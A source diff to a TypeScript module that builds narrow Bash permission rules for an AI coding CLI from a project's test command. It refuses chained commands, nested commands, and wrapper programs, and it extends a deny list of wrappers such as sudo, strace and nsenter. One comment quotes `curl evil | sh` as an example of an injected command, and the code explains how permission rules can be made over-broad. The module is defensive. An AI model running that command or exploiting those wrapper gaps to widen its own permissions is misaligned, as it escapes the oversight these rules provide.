@@ -21,8 +21,8 @@
  * `Bash(npx *)` can fetch and run a package. The bound is "the one program
  * your tests run, plus git", not a sandbox.
  *
- * Two facts about the CLI this module leans on, read out of the 2.1.296
- * binary rather than assumed:
+ * Four facts about the CLI this module leans on, read out of the 2.1.296
+ * binary's own rule matcher rather than assumed:
  *
  * - A rule of the form `Tool(word *)`, with that one wildcard, is compiled to
  *   `^word( .*)?$`. The trailing argument is **optional**, so a single-word
@@ -31,6 +31,17 @@
  * - `Bash(*)` and `Bash()` are both normalised to the bare tool name `Bash`,
  *   which allows every command. That is why `deriveAllowedTools` refuses
  *   rather than ever emitting an empty or wildcard program.
+ * - **An allow rule never matches a command that is more than one command.**
+ *   The matcher parses each candidate and refuses every prefix and wildcard
+ *   rule when it splits into more than one, so `Bash(npm *)` cannot allow
+ *   `npm test && curl evil | sh`, and equally `Bash(cd *)` cannot allow
+ *   `cd pkg && npm test`. The segments are evaluated one at a time, so a
+ *   compound command needs a rule per command it runs.
+ * - Leading environment assignments and wrapper programs are stripped before
+ *   matching **deny and ask rules only**, never allow rules. So a deny rule
+ *   cannot be dodged by writing `sudo` or `CI=1` in front - and an allow rule
+ *   for a wrapper is not narrowed either: `Bash(sudo *)` and
+ *   `Bash(timeout *)` really do grant whatever follows.
  *
  * `--allowedTools` takes a comma- or space-separated list and keeps commas and
  * spaces that sit inside parentheses, so one comma-joined value carries rules
@@ -101,20 +112,21 @@ export function permissionArgs(project: Project): string[] {
  *
  * - **Too broad** is the worse one. An empty or wildcard word yields
  *   `Bash(*)`, which the CLI reads as every command. A wrapper word is the
- *   same thing wearing a hat: `Bash(sh *)`, `Bash(sudo *)` and
- *   `Bash(timeout *)` all grant "run anything you like", and because a
- *   wildcard rule is matched against the whole command line, `Bash(cd *)`
- *   allows `cd /any && <anything>` too.
+ *   same thing wearing a hat: wrapper stripping applies to deny and ask rules
+ *   only, so `Bash(sh *)`, `Bash(sudo *)` and `Bash(timeout *)` each grant
+ *   "run anything you like".
  * - **Too narrow** denies the suite, so every run fails at verification with
- *   nothing in the output naming this field. A compound or env-prefixed
- *   command does exactly that: the leading word of `cd packages/api && npm
- *   test` is `cd`, and of `CI=1 npm test` is `CI=1`, so the rule grants
- *   something other than the suite while the suite is denied.
+ *   nothing in the output naming this field. `cd packages/api && npm test`
+ *   lands here: no allow rule matches a command that is more than one
+ *   command, so a rule derived from `cd` cannot cover the line however broad
+ *   it looks, and the command that matters is refused. Granting a word that
+ *   only changes the shell's state has the same shape.
  *
- * The env-prefixed case lands on both: run through the CLI's own matcher,
- * `Bash(npm *)` does not match `CI=1 npm test` at all, and `Bash(CI=1 *)`
- * matches `CI=1` followed by **any** command - a blanket shell behind a
- * harmless-looking prefix.
+ * The env-prefixed case lands on both. `Bash(npm *)` does not match
+ * `CI=1 npm test`, because an allow rule is matched against the command as
+ * typed; and `Bash(CI=1 *)` matches that assignment followed by **any**
+ * command, because `CI=1 anything` is still one command - a blanket shell
+ * behind a harmless-looking prefix.
  *
  * Neither is worth guessing at, so those shapes throw. Refusing costs one
  * line of config and says which line; the two silent outcomes cost a repo or
@@ -126,18 +138,32 @@ function program(project: Project): string {
     refuse(project, "it is blank, so there is no program to grant")
   }
 
-  // Anything that chains, substitutes, redirects, quotes or escapes means the
-  // string is not one literal command, so its first word is not the program
-  // that runs the tests. Globs in the *arguments* are left alone: they never
-  // reach the rule.
-  const meta = /[&|;\n\r<>$`"'\\()]/.exec(testCmd)
-  if (meta) {
+  // More than one command. No allow rule matches a command that chains, so a
+  // rule derived from the first word cannot cover the line however broad it
+  // looks, and the command that runs the tests is refused.
+  const chained = /[&|;\n\r]/.exec(testCmd)
+  if (chained) {
     refuse(
       project,
-      `it contains ${JSON.stringify(meta[0])}, so it is not one literal command and its first word is not the program that runs the tests`,
+      `it runs more than one command (${JSON.stringify(chained[0])}), and no allow rule matches a command that chains - list a rule for each command it runs`,
     )
   }
 
+  // A command nested inside this one runs too, and a rule for the outer
+  // program says nothing about it. The pattern is the CLI's own test for a
+  // nested command, plus a subshell.
+  const nested = /\$\(|`|<\(|>\(|\$\{[ \t\n|]|[()]/.exec(testCmd)
+  if (nested) {
+    refuse(
+      project,
+      `it contains ${JSON.stringify(nested[0])}, so it runs a command inside itself that a rule for its first word would not cover`,
+    )
+  }
+
+  // Quotes, backslashes, `$VAR` and redirections in the *arguments* are left
+  // alone: the rule carries only the first word, redirections are stripped
+  // before matching, and a quote or escape in the first word is caught below
+  // by the literal-name check rather than guessed at.
   const word = testCmd.split(/\s+/)[0] ?? ""
   if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(word)) {
     refuse(
@@ -157,23 +183,38 @@ function program(project: Project): string {
       `its first word ${JSON.stringify(word)} runs whatever it is given, so Bash(${word} *) would grant an arbitrary shell rather than this project's tests`,
     )
   }
+  if (STATE_ONLY.has(word)) {
+    refuse(
+      project,
+      `its first word ${JSON.stringify(word)} changes the shell's own state and runs no suite, so Bash(${word} *) would grant something the tests cannot use while the command that runs them stays denied`,
+    )
+  }
   return word
 }
 
 /**
- * Leading words that are not a test runner: each one either runs another
- * command or only changes the shell's state, so a rule built from it grants
- * far more than the suite, or nothing that can run it.
+ * Leading words that run whatever they are handed, so a rule built from one
+ * grants an arbitrary shell rather than a test runner.
+ *
+ * Most of this is the CLI's own list of programs it strips before matching a
+ * deny or ask rule - exactly so a deny cannot be dodged by writing `sudo` or
+ * `strace` in front. Allow rules are **not** stripped, so the same list is
+ * where a derived allow rule would quietly become blanket. The shells and
+ * `eval` are added for the same reason.
  *
  * This is a tripwire, not a security boundary. A wrapper that is not listed
  * derives a grant as broad as the wrapper - the same honest limit `npx` and
  * `make` already have - and the fix is the same explicit `allowedTools`.
  */
 const WRAPPERS = new Set([
+  // `source` and `.` run a file in the current shell, and `Write` is granted,
+  // so they are a blanket shell with one extra step rather than a state-only
+  // word like `cd`.
   ".",
+  "source",
   "bash",
   "builtin",
-  "cd",
+  "chrt",
   "command",
   "csh",
   "dash",
@@ -182,19 +223,37 @@ const WRAPPERS = new Set([
   "eval",
   "exec",
   "fish",
+  "flock",
+  "ionice",
   "ksh",
+  "ltrace",
   "nice",
+  "nocorrect",
+  "noglob",
   "nohup",
+  "nsenter",
+  "pkexec",
+  "script",
+  "setsid",
   "sh",
-  "source",
+  "strace",
   "su",
   "sudo",
+  "taskset",
   "tcsh",
   "time",
   "timeout",
+  "unshare",
+  "watch",
   "xargs",
   "zsh",
 ])
+
+/** `cd` only changes the shell's working directory, so its grant is useless
+ * rather than dangerous: the suite never runs, and the run fails at
+ * verification. `cd packages/api && npm test` is the shape that gets here,
+ * and the chaining check refuses it first. */
+const STATE_ONLY = new Set(["cd"])
 
 /** Names the project, the value, the reason and both ways out, because §2.2
  * promises the fix is a line of config rather than a debugging session. */
